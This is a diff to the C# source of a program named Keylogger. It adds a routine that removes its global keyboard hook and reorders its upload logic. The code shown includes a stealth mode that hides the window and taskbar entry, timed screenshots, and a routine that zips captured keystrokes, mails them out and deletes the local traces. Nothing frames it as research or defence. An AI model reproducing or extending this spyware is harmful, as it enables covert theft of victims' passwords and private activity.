@@ -253,6 +253,11 @@ namespace Keylogger
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
         }
 
+        private void KeyClose()
+        {
+            gkh.KeyDown -= new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
+        }
+
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
             new Thread(() =>
@@ -543,16 +548,17 @@ namespace Keylogger
                 Ping ping = new Ping();
                 PingReply reply = ping.Send(@"google.com");
                 status = reply.Status;
-            }
-            catch { }
-            if (status == IPStatus.Success)
-            {
-                CreateZIP();
-                SendMail();
-                DeleteZIP();
-                DeleteFile();
 
+                if (status == IPStatus.Success)
+                {
+                    CreateZIP();
+                    SendMail();
+                    DeleteZIP();
+                    DeleteFile();
+
+                }
             }
+            catch { }            
 
         }
 
@@ -703,12 +709,7 @@ namespace Keylogger
                 txtNumMail.Text = _numValueMail.ToString();
         }
 
-        #endregion
-
-        #region BufferExchange
-
-
-        #endregion
+        #endregion       
 
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
@@ -746,7 +747,7 @@ namespace Keylogger
         private void Stealth_Checked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
-            ShowInTaskbar = false;
+            ShowInTaskbar = false;            
             KeysLoad();
             timerScreen.Start();
             timerMail.Start();
@@ -756,6 +757,7 @@ namespace Keylogger
         {
             Application.Current.MainWindow.Visibility = Visibility.Visible;
             ShowInTaskbar = true;
+            KeyClose();
             timerScreen.Stop();
             timerMail.Stop();
         }
